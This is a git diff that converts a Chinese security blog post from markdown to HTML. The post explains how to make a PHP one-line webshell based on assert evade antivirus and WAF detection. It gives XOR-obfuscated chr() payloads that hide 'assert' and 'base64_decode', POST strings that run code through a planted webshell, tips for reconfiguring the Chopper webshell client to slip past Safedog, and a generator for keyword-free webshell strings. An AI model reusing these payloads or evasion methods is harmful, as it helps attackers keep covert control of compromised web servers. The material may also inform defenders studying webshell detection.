@@ -1,20 +1,22 @@
 
----
-layout:     post
+<hr />
+<p>layout:     post
 title:      assert免杀一句话
 date:       2016-11-25
 summary:    assert免杀一句话
 categories: web
-tags:
- - webshell
- - assert
- - eval
----
+tags:</p>
+<ul>
+  <li>webshell</li>
+  <li>assert</li>
+  <li>
+    <h2 id="eval">eval</h2>
+  </li>
+</ul>
 
-### 0x00 eval和assert的区别
+<h3 id="0x00-eval和assert的区别">0x00 eval和assert的区别</h3>
 
-```
-http://www.vuln.cn/8395
+<div class="highlighter-rouge"><pre class="highlight"><code>http://www.vuln.cn/8395
 http://www.php.net/manual/zh/function.eval.php
 http://php.net/manual/zh/functions.variable-functions.php
 
@@ -55,12 +57,12 @@ b)assert("echo 1")是不可执行的,因为assert不能执行echo,eval("echo 1")
 c)assert("print_r(1);print_r(2);")或assert("print_r(1);print_r(2)")都只能执行print_r(1),assert只会执行到第一个
 分号内的语句
 
-```
+</code></pre>
+</div>
 
-### 0x01 一个waf的绕过过程
+<h3 id="0x01-一个waf的绕过过程">0x01 一个waf的绕过过程</h3>
 
-```
-1.waf过滤大部分关键字,eg.base64_decode,``,system等
+<div class="highlighter-rouge"><pre class="highlight"><code>1.waf过滤大部分关键字,eg.base64_decode,``,system等
 
 2.尝试用如下方法绕过[uri=mytag_js.php?aid=9527],是个assert类型的webshell,通过echo不能执行,print_r可以执行判断出
 不是eval类型webshell
@@ -69,11 +71,11 @@ c)assert("print_r(1);print_r(2);")或assert("print_r(1);print_r(2)")都只能执
 http://joychou.org/index.php/web/make-own-chopper-which-can-bypass-dog.html
 
 4.hackbar中post:[下面假设密码是x]
-x=eval("echo 1;$one=(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(96)).(chr(19)^chr(118)).(chr(19)^chr(97)).(chr(19)^chr(103));$three=(chr(19)^chr(113)).(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(118)).(64).(chr(19)^chr(76)).(chr(19)^chr(119)).(chr(19)^chr(118)).(chr(19)^chr(112)).(chr(19)^chr(124)).(chr(19)^chr(119)).(chr(19)^chr(118));echo $_POST[nihao];")&nihao=cGhwaW5mbygp
+x=eval("echo 1;$one=(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(96)).(chr(19)^chr(118)).(chr(19)^chr(97)).(chr(19)^chr(103));$three=(chr(19)^chr(113)).(chr(19)^chr(114)).(chr(19)^chr(96)).(chr(19)^chr(118)).(64).(chr(19)^chr(76)).(chr(19)^chr(119)).(chr(19)^chr(118)).(chr(19)^chr(112)).(chr(19)^chr(124)).(chr(19)^chr(119)).(chr(19)^chr(118));echo $_POST[nihao];")&amp;nihao=cGhwaW5mbygp
 
 其中$one="assert",$three="base64_decode",$nihao="phpinfo()"以base64编码后的结果,结果无法成功执行phpinfo(),将
 chr去掉变成:
-x=eval("echo 1;echo $_POST[nihao];")&nihao=cGhwaW5mbygp,可以执行简单的echo,现在要想办法把$one和$three换成其他形
+x=eval("echo 1;echo $_POST[nihao];")&amp;nihao=cGhwaW5mbygp,可以执行简单的echo,现在要想办法把$one和$three换成其他形
 式,其他不是chr组合的形式
 
 5.尝试post换成如下数据[没有chr]:
@@ -96,7 +98,7 @@ x=eval('$filename ="../index.php";
 结果可以执行成功,只是控制起来不方便,每次要自己写php代码,尝试改chopper,将里面的关键处的base64_decode换掉
 
 8.最新版本的菜刀可配置度较高,但仍然采用base64加密传输,在菜刀目录下有个caidao.conf
-利用下面两个特性更改<PHP_BASE>标签中的连接方法可过狗:
+利用下面两个特性更改&lt;PHP_BASE&gt;标签中的连接方法可过狗:
 a)assert类型的webshell正常情况下只能执行一句话[一个分号内的内容],想让assert类型的webshell执行多句php代码,可借
 助eval执行多条命令
 b)把base64_decode想办法混淆
@@ -106,17 +108,17 @@ eval('$a=chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(
 
 9.在waf阻拦下无法连接一句话chopper时,每种waf的阻拦规则不一样,可在新版chopper目录下放多个不同的可过waf的配置文件
 备用,一个caidao.conf不过狗时再用其他caidao.conf,有效配置为"caidao.conf"文件
-```
+</code></pre>
+</div>
 
-### 0x02 免杀无特征无关键字一句话
+<h3 id="0x02-免杀无特征无关键字一句话">0x02 免杀无特征无关键字一句话</h3>
 
-```
-1.用chr(%d)^chr(%d)代替上面的chr
+<div class="highlighter-rouge"><pre class="highlight"><code>1.用chr(%d)^chr(%d)代替上面的chr
 
-for($i=1;$i<=200;$i++)
+for($i=1;$i&lt;=200;$i++)
 {echo 'chr(19)^chr('.$i.') is:';
 echo chr(19)^chr($i);
-echo '<br>';}
+echo '&lt;br&gt;';}
 
 2.上面的php代码可得到以chr(19)为基础的关键字的组合形式如下:
 
@@ -168,14 +170,15 @@ f)最后将cmd=xxxxxxxxxxxx 在hackbar中post出去,其中xxxxxxxxx是e中编码
 a)传输的数据是base64加密过的没有任何关键字的数据
 b)服务端一句话没有任何关键字
 c)利用方式不是很方便
-```
+</code></pre>
+</div>
 
-### 0x03 相关链接
+<h3 id="0x03-相关链接">0x03 相关链接</h3>
 
-```
-1.mytag_js.php样本文件及分析
+<div class="highlighter-rouge"><pre class="highlight"><code>1.mytag_js.php样本文件及分析
 样本文件:https://github.com/3xp10it/webshell/tree/master/mytag_js
 相关分析:http://www.nxadmin.com/penetration/1168.html
-```
+</code></pre>
+</div>
 
-Attention:首发于360播报,版权归360播报所有
+<p>Attention:首发于360播报,版权归360播报所有</p>
